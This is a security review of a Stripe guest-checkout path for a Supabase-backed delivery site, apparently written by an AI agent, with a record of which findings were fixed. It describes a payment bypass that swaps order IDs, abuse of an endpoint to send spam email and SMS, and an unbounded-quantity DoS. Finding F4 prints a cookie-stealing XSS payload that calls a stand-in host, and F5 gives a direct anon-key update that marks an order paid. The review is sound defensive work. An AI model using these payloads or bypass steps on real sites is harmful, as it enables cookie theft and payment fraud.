# Metro Checkout Security Review (R2-CHECKOUT-SECURITY-REVIEW)

Status: COMPLETE for the files that exist as of this pass. Re-check needed once the concurrent
agent lands `verifyLogic.ts`, `verify-metro-payment/index.ts`, `metro-stripe-webhook/`, and
`MetroOrderConfirmedPage.tsx` — none of those existed in the working tree at review time.

Branch reviewed: `feature/metro-ui`
Scope: New metro Stripe checkout path (guest checkout, card authorization hold with manual
capture) for the live MyGravelGuy production site.

## Files reviewed

Client / shared: `src/metro/checkout/contract.ts`, `serverQuote.ts` (+ `serverQuote.test.ts`,
`bundleParity.test.ts`), `scripts/metro/export-metro-checkout-bundle.mjs`,
`src/metro/services/metroCheckoutService.ts` (+ test), `src/metro/hooks/useMetroOrder.ts`,
`src/metro/lib/pricing.ts`, `src/metro/lib/dates.ts`.

Server: `supabase/functions/_shared/metro-checkout.bundle.js`,
`supabase/functions/create-metro-checkout/index.ts`, `supabase/config.toml`.

Reference / comparison (read-only, not edited, but directly load-bearing for the metro flow):
`supabase/functions/create-auth-hold/index.ts`, `supabase/functions/verify-payment/index.ts`
(the metro design explicitly routes finalization through this function's existing `CART-`
branch, unchanged), `supabase/functions/process-abandoned-carts/index.ts`, client-side
`orders` table access across `src/services/*.ts` and `src/pages/PaymentSuccess.tsx`.

**Not found in the repo at review time** (so not reviewed): `src/metro/checkout/verifyLogic.ts`,
`supabase/functions/verify-metro-payment/`, `supabase/functions/metro-stripe-webhook/`,
`src/pages/metro/MetroOrderConfirmedPage.tsx`. `supabase/migrations/**` contains no
`CREATE POLICY` / `ROW LEVEL SECURITY` statements for the `orders` table at all — its RLS
policy is not tracked in this repo, so it could not be confirmed by static reading.

## Findings

| ID | Severity | File:Line | Issue | Exploit scenario | Confirmed / Speculative |
|----|----------|-----------|-------|-------------------|--------------------------|
| F1 | **Critical** | `supabase/functions/verify-payment/index.ts:100, 529-606` (CART- branch) | The `CART-` branch (the exact code path the metro contract relies on unchanged) never cross-checks that the verified Stripe session/PaymentIntent actually belongs to the `orderId` it updates, and never compares the Stripe-paid amount to the order's `total_price`. `verificationResult.orderId` is set once from the raw client-submitted `orderId` request field (line 100) and is **never** overwritten from `stripeObject`/Stripe session metadata anywhere in the Stripe-verification block (lines 108-208). The guest path has no email/ownership check at all (the `user &&` check at line 136 only applies to logged-in users, and even then only checks email, not order/amount). | Attacker completes a genuine, cheap Stripe Checkout session for their own tiny `CART-METRO-...` order (e.g. minimum order, a few dollars). They then call `verify-payment` directly (it's `verify_jwt=false`, CORS `*`, callable from anywhere) with that real `paymentIntentId`/`session_id` but substitute a **different** `orderId` — e.g. another customer's higher-value `CART-METRO-...` row (order IDs are not secret: predictable `CART-METRO-<timestamp>-<6 base36 chars>` format, and are echoed back to the client / stored in localStorage / appear in the `/payment-success` URL query string, so they leak easily). The update at line 585-590 matches purely on `order_id = <attacker-supplied orderId> AND status = 'cart'` and flips that row to `authorized`/`paid` — a full payment-amount bypass for someone else's order using a single cheap real payment. | **Confirmed** by code reading (this file is unmodified by the metro branch — `git diff main -- supabase/functions/verify-payment/index.ts` is empty, so this is a live, pre-existing gap that the new metro path inherits by design). |
| F2 | **Critical** | `supabase/functions/verify-payment/index.ts:538, 668, 736` | `paymentStatus` is referenced in three places but is **never declared** anywhere in the file (it was replaced by `orderStatus` in commit `68e6374862665af...` "feat: Implement authorization holds for checkout", which added `let orderStatus = ...` but forgot to update the three later `status: paymentStatus` / `payment_status: paymentStatus` usages). Every successful verification throws a `ReferenceError` inside the try block, which is swallowed by the outer `catch (dbError)` (line 754), so the function silently returns the raw `verificationResult` with no `orders` update having happened. | Every metro (and legacy) checkout that reaches this code path: the customer's card gets authorized by Stripe, but the `orders` row is **never** flipped from `status='cart'` to `authorized`/`paid` — it just sits there. One hour later, `process-abandoned-carts` (which only filters on `status = 'cart'`) treats the now-*paid* customer's order as an abandoned cart and emails/texts them "you left something in your cart!" — a real customer-trust and ops-reconciliation problem, not just a theoretical bug. | **Confirmed** via direct code read + `git log -p` blame; identical on `main` (not introduced by this branch). |
| F1↔F2 interaction | — | — | F2 currently causes the entire CART-branch DB write to crash *before* it can matter — which incidentally "masks" F1 (the session/order-confusion bypass) today. **Fixing F2 in isolation, without also fixing F1, immediately re-opens a full payment-bypass hole.** Any fix plan must land both together. | — | Confirmed (logical consequence of F1 + F2 both being real). |
| F3 | **Critical / High** | `supabase/functions/create-metro-checkout/index.ts:93-126` + `supabase/functions/process-abandoned-carts/index.ts:163-170, 276-366` | `create-metro-checkout` is unauthenticated (`verify_jwt=false`), CORS `*`, has no rate limiting or CAPTCHA, and inserts an `orders` row with `status='cart'` — including attacker-chosen `delivery_email`/`delivery_name`/`delivery_phone` (validated only for *shape*: non-empty string / regex, never ownership) — **before** any Stripe interaction. `process-abandoned-carts` runs on a schedule, selects all `status='cart'` rows with a non-null `delivery_email` older than 1 hour, and automatically sends a branded HTML email via Resend, plus (for carts ≥ $1,000 total) an unsolicited SMS via Twilio to `delivery_phone`. | Attacker POSTs directly to `create-metro-checkout` (no browser/CORS needed) with a victim's real email and/or phone number and a qualifying quantity/total, never completes Stripe checkout. 1+ hours later MyGravelGuy's own infrastructure sends the victim an unsolicited marketing email, and — if the fabricated total is ≥$1,000 (trivial: pick a large quantity) — an unsolicited SMS text (TCPA exposure), at zero cost/effort to the attacker and using MyGravelGuy's Resend/Twilio reputation and budget. Also trivially DB-spammable (unlimited cart rows). | **Confirmed** by code reading of both functions; the abandoned-cart automation itself is pre-existing, but `create-metro-checkout` is new code that reproduces/extends the same unauthenticated-cart-row-creation pattern for the metro flow. |
| F4 | **High** | `supabase/functions/process-abandoned-carts/index.ts:41-46, 59, 75-77` | `delivery_name` (→ `contact.name`) and `delivery_street/city/state/zip` (→ `request.address`) are interpolated directly into the abandoned-cart HTML email template with **no HTML-escaping** anywhere (`buildEmail`'s `intros[seq]` uses `${firstName}` raw; `renderCartItems` uses `${item.delivery_address.street}` etc. raw). `serverQuote.validateRequest` only checks these are non-empty strings — there is no sanitization/escaping in the metro checkout pipeline at all. | `contact.name = '<img src=x onerror=fetch("//evil/"+document.cookie)>'` (or any HTML/markup) passes validation, is stored verbatim, and is rendered unescaped inside a real outbound HTML email sent from MyGravelGuy's domain via Resend to the address the attacker supplied (self, or — combined with F3 — a victim). Even without JS execution in modern mail clients, this is HTML injection/defacement of a transactional-looking email and a phishing vector; if `delivery_name`/`delivery_address` is ever rendered unescaped in an internal admin dashboard, it also becomes stored XSS against staff. | **Confirmed** by code reading. |
| F5 | **High (partially unconfirmed — needs live check)** | `supabase/migrations/**` (no `orders` RLS found); `src/services/orderService.ts:402-410` (`updateOrderStatus`), `src/pages/PaymentSuccess.tsx:660-703` (raw "checkout-style insert" fallback), and ~35 other client-side `supabase.from('orders')` call sites | No migration in this repo creates the `orders` table or defines its RLS policy — it is untracked/managed outside version control. Meanwhile the client bundle ships the public anon key and calls `.insert()/.update()/.select()` against `orders` directly from dozens of call sites, including a generic, ownership-unchecked `updateOrderStatus(orderId, status)` and a raw insert path. | *If* RLS on `orders` is permissive for anon (plausible — the app clearly depends on anon INSERT working today for guest checkout, and this pattern is what makes client-side "checkout-style insert" work at all), a malicious guest could skip Stripe entirely and call `supabase.from('orders').update({status:'paid'}).eq('order_id','CART-METRO-...')` directly via the public anon key/REST API — bypassing payment completely — or `.select()` other customers' PII (name/email/phone/address) from `orders`. This is the single most important open question for "is it safe to ship the metro checkout path." | **Could not verify** — this review is read-only and forbidden from calling deployed Supabase/Stripe endpoints. **Must be confirmed against the live project's RLS policies (Supabase dashboard → Authentication → Policies, or `supabase db pull`) before go-live.** Treat as High until confirmed; escalate to Critical if anon UPDATE/SELECT turns out to be unrestricted. |
| F6 | Medium | `src/metro/checkout/serverQuote.ts:69-71` (`validateRequest`); `src/metro/lib/pricing.ts:43-58` (`planLoads`) | `quantity` is only checked for `> 0` and `Number.isFinite` — there is no upper bound. `planLoads()` loops `while (remaining > largestCap + 1e-9) { ...; remaining -= largestCap; }`, one iteration per truckload. | `quantity: 1e12` (still a normal finite number, passes validation) makes the server-side quote computation loop an astronomically large number of times inside `create-metro-checkout`, hanging/spinning the edge function (CPU billing + platform-level timeout risk) before any `BELOW_MINIMUM`/price check can reject it — a cheap, unauthenticated DoS trigger. | **Confirmed** by code reading. |
| F7 | Medium | `src/metro/checkout/serverQuote.ts:61-102` (`validateRequest`) | No maximum length is enforced on any free-text field: `contact.name`, `contact.mobile`, `dropNotes`, `address.street`, `address.city`. | Multi-megabyte strings in `dropNotes`/`name`/`street` are accepted, stored in Postgres, and (per F4) rendered into outbound emails — enables storage bloat and oversized-email abuse alongside F4's injection risk. | **Confirmed** by code reading. |
| F8 | Low / Info | `supabase/functions/create-metro-checkout/index.ts:152, 162, 172` vs. `src/metro/checkout/serverQuote.ts:206` | Each Stripe line item rounds its own dollar amount to cents independently (`Math.round(x * 100)`), while `orders.total_price` stores `basePrice + saturdayFee + rushFee` as a single JS float sum. In rare floating-point edge cases these two ways of arriving at "the total in cents" can differ by ±$0.01. | Not exploitable for meaningful gain; a financial-reconciliation nitpick, not a security bug. | Confirmed by code reading; theoretical, not reproduced. |
| F9 | Low / Info | `src/metro/lib/pricing.ts:63-99` | No server-side enforcement of the half-unit (`0.5`) quantity step the client UI enforces (`roundToHalf` in `useMetroOrder.ts`) — `buildServerQuote` accepts any positive finite quantity (e.g. `7.3333`). | Not exploitable for meaningful price manipulation (cost scales ~proportionally with quantity), just an unenforced business rule. | Confirmed by code reading. |
| — | Info (verified safe) | `src/metro/checkout/serverQuote.ts:314-338` (`resolveMetroCheckoutOrigin`, `resolveCancelPath` in the edge function) | Open-redirect surface analyzed: `cancel_url` is always built as `${allowlisted-origin}${cancelPath}`, so no value of `cancelPath` (including backslash variants like `/\evil.com` not covered by the existing `!startsWith('//')` test) can introduce a new authority/host in the final URL — the origin is always the fixed, allowlisted prefix. | — | Confirmed safe by URL-parsing reasoning; existing tests (`serverQuote.test.ts`) only cover the `//evil.com` case, worth a regression test for the backslash variant for documentation but not a real gap. |
| — | Info (verified safe) | `src/metro/lib/dates.ts`, `src/metro/checkout/serverQuote.ts:165-174` | Saturday/rush flags and available dates are derived entirely server-side from `getDeliveryDayOptions(metro, now)`; an explicit test (`serverQuote.test.ts` — "ignores client-supplied saturday/rush-shaped fields") documents that client-smuggled `isSaturday`/`isRush` fields are ignored. | — | Confirmed safe. |
| — | Info (verified safe) | `supabase/functions/create-metro-checkout/index.ts:137-176` | Every Stripe `unit_amount` is built exclusively from the server-recomputed `serverQuote` (never client input). `expectedTotal` is only used for the `PRICE_CHANGED` UX nudge (±$0.01 tolerance) and never trusted for the actual charge. `metroSlug`/`categorySlug`/`variantSlug` are resolved via `.find()` against static in-repo config objects (never dynamic property/prototype access), so parameter-injection/prototype-pollution attempts just resolve to `undefined` → `INVALID_INPUT`. | — | Confirmed safe. |
| — | Info | `docs/metro/research/metro-checkout-server.md`, `bundleParity.test.ts` | `npx vitest run src/metro/checkout` passes locally (460 tests, 2 files) — the generated `supabase/functions/_shared/metro-checkout.bundle.js` currently matches `serverQuote.ts`, no drift detected. `METRO_CHECKOUT_ALLOW_UNCONFIRMED` defaults safely to `false` (strict `=== "true"` string check). CORS `*` on `create-metro-checkout` is consistent with existing `create-auth-hold`/`verify-payment` and doesn't materially widen the attack surface given the endpoint is already callable unauthenticated from non-browser clients regardless of CORS. | — | Confirmed. |

## Verdict: Safe to deploy behind the gate?

**No — not yet.** The feature is gated off in production today (`isMetroCheckoutEnabled` requires
both `metro.priceBookConfirmed === true` AND `VITE_METRO_CHECKOUT_ENABLED === 'true'`, and both DFW
and Long Island currently have `priceBookConfirmed: false`), so there is no immediate live exposure.
Before flipping that gate for any metro:

1. **Must fix before enabling, together**: F1 (session/order confusion — full payment bypass) and
   F2 (`paymentStatus` ReferenceError — orders never finalize) in `verify-payment/index.ts`. F1 in
   particular is a full payment-amount bypass and is the most severe finding in this review.
2. **Must confirm before enabling**: F5 — get the live `orders` RLS policy from Supabase directly;
   this review could not access it and it determines whether several other findings are exploitable
   by a raw anon REST call.
3. **Should fix before enabling**: F3 (rate-limit/CAPTCHA or gate abandoned-cart emails on verified
   orders only, to close the spam/harassment vector) and F4 (HTML-escape all user-supplied strings
   before they reach any email template).
4. **Nice to have**: F6/F7 (bound `quantity` and free-text field lengths), F8/F9 (rounding/step
   nitpicks).
5. **Re-review required**: `verifyLogic.ts`, `verify-metro-payment/index.ts`,
   `metro-stripe-webhook/`, and `MetroOrderConfirmedPage.tsx` did not exist at review time and
   were not assessed — in particular check whether the new confirmation page does a raw
   client-side `orders` select by `order_id` (would compound F5) versus requiring both
   `order_id` and `session_id` server-side.

The price-tampering, date-manipulation, parameter-injection, and open-redirect surfaces that are
*new* in this branch (`serverQuote.ts`/`create-metro-checkout`) are solid — well-tested,
server-authoritative, and no exploitable gaps found there. The critical risk is entirely in the
shared/pre-existing `verify-payment` finalization path this feature deliberately reuses unchanged,
plus the unauthenticated-cart-creation + abandoned-cart-email combination that's new in this branch.

## Resolution (A1v3-METRO-CHECKOUT-HARDENING, 2026-09-28)

Scope for this pass was F3, F4, F6, F7, F8, F9 (the metro-specific findings). F1, F2, and F5 are
about the legacy, shared `verify-payment` function and the undocumented `orders` RLS policy —
explicitly out of scope (touching `verify-payment` was already rejected by the orchestrator for
regression-risk reasons; `orders` RLS requires live dashboard access this agent doesn't have) and
remain **unfixed**. This section states what changed and how; it does not rewrite the findings
above.

- **F3 (Critical/High — unauthenticated cart-row creation → abandoned-cart spam/DB-spam) — FIXED.**
  `create-metro-checkout` no longer inserts any `orders` row. The order id and every field needed
  to build the order are written into the Stripe Checkout Session's `metadata` instead (a
  server-to-Stripe-held value, never client-editable after creation) and the `orders` row is only
  ever inserted once a payment for that exact session has been verified — either by
  `verify-metro-payment` (the customer's own confirmation-page call) or the new
  `metro-stripe-webhook` function (Stripe's server-to-server event, covering the case where the
  customer closes the tab before the page's own call completes). An attacker POSTing directly to
  `create-metro-checkout` with a victim's email/phone now produces **zero** DB rows and **zero**
  emails/SMS — there is nothing for `process-abandoned-carts` to find unless a real Stripe payment
  was actually authorized against a real card. See `docs/metro/research/metro-checkout-server.md`'s
  "2026-09-28 hardening pass" section for the full flow diagram and
  `src/metro/checkout/conversion.ts` for the metadata (de)serialization + insert-race handling
  that keeps the single, deferred insert idempotent no matter which of the two callers gets there
  first.
- **F4 (High — unescaped HTML injection into outbound emails) — FIXED.** Every field that
  traces back to user input (customer name, delivery address lines, etc.) is now run through
  `escapeHtml` (`src/metro/checkout/emailTemplates.ts`, unit-tested in `emailTemplates.test.ts`
  with literal `<script>`/`<img onerror>` payloads) before being interpolated into any of the
  three email templates (customer confirmation, internal new-order notification, and the new
  internal review-required alert). This applies to both the `verify-metro-payment`-triggered
  notifications and the `metro-stripe-webhook`-triggered ones, since both call the same shared
  `supabase/functions/_shared/metro-conversion-runner.ts` → `emailTemplates.ts` code path. (Note:
  `process-abandoned-carts`' own email templates were NOT touched — they're unaffected by this
  fix since F3 already means no cart row exists for that function to ever pick up in the metro
  case; `process-abandoned-carts` itself is shared/pre-existing code outside this agent's file
  ownership.)
- **F6 (Medium — unbounded quantity → DoS in `planLoads`) — FIXED.** `validateRequest`
  (`serverQuote.ts`) now rejects any `quantity > METRO_QUANTITY_MAX` (500, documented in
  `contract.ts` — derived from ×10 headroom over the largest configured truck capacity across
  both metros, 28 tons / 20 yd, rounded up to a flat number). `1e12` and similar now fail
  `INVALID_INPUT` (400) before any pricing computation runs.
- **F7 (Medium — unbounded free-text fields) — FIXED.** `METRO_INPUT_CAPS` (`contract.ts`) bounds
  every free-text field (name 100, email 254, mobile 20, street 200, city 100, state 2, zip 5,
  dropNotes 500, each utm value 200 with a 10-key allowlist) and `sanitizeCheckoutRequest`
  (`serverQuote.ts`) trims, strips ASCII control characters, and truncates to these caps before
  `validateRequest` ever runs — closing both the storage-bloat/oversized-email angle this finding
  described and (combined with F4's escaping) tightening the injection surface further.
- **F8 (Low/Info — ±$0.01 line-item/DB-total rounding drift) — FIXED.** `buildLineItemCents`
  (`serverQuote.ts`) computes all three possible Stripe line-item amounts from the same
  integer-cents arithmetic as the total, reconciling any rounding remainder onto the base-price
  line so the line items always sum to exactly `amount_total` in cents. Unit-tested in
  `serverQuote.test.ts`.
- **F9 (Low/Info — unenforced half-unit quantity step) — FIXED.** `validateRequest` now rejects
  any `quantity` not on the `METRO_QUANTITY_STEP` (0.5) grid the client UI already enforces
  (`isOnQuantityStep`, tolerant of float error), closing the gap between client and server rules.
- **F1, F2 (Critical — `verify-payment`'s session/order-confusion bypass + `paymentStatus`
  ReferenceError) — NOT FIXED, unchanged, out of scope.** Irrelevant to the current metro design
  regardless: metro no longer routes through `verify-payment` at all (it has its own isolated
  `verify-metro-payment`/`metro-stripe-webhook` conversion path, unaffected by either bug), so
  these findings' *exploit scenarios as originally written* (which assumed metro relied on
  `verify-payment`'s `CART-` branch) no longer apply to metro specifically — but the findings
  themselves are still live, unpatched bugs in the shared `verify-payment` function affecting the
  legacy `/cart` → `/checkout` → `/payment-success` flow, and should be tracked/fixed separately.
- **F5 (High, partially unconfirmed — `orders` RLS policy unknown) — NOT FIXED, still unconfirmed.**
  This agent has no live Supabase dashboard/CLI access and could not check the `orders` table's
  RLS policy. Given F3's fix, the blast radius of a permissive-anon-RLS scenario for metro
  specifically is now smaller (a malicious anon client could still, in theory, `INSERT` or
  `UPDATE` an `orders` row directly via the public anon key/REST API, bypassing this entire
  Stripe-mediated flow — that vector is unaffected by anything in this pass, since it never goes
  through `create-metro-checkout`/`verify-metro-payment` at all). **Still must be confirmed
  against the live project's RLS policies before any metro goes live** (both metros remain
  `priceBookConfirmed: false`, so there is no current exposure).

### Verification

`npx vitest run src/metro src/pages/metro` — 639 tests passing, including new coverage for every
fix above (`serverQuote.test.ts`'s caps/cents-math tests, `emailTemplates.test.ts`'s escaping
tests, `conversion.test.ts`'s metadata round-trip/race-resolution tests, `verifyLogic.test.ts`'s
webhook-event-filtering tests). `npx tsc --noEmit -p tsconfig.app.json` and `npx eslint src/metro
scripts/metro src/pages/metro` both clean of any new issues (pre-existing issues in files this
agent didn't touch are unchanged). Edge function `.ts` files under `supabase/functions/` are not
covered by either check (Deno isn't installed in this environment, and `tsconfig.app.json` only
includes `src/`) — reviewed manually instead; see `docs/metro/research/metro-checkout-server.md`'s
manual Stripe-TEST-mode plan (steps 12-14 are new, covering the tab-close/webhook-only conversion
path, the double-conversion race, and the review-required/price-mismatch path).
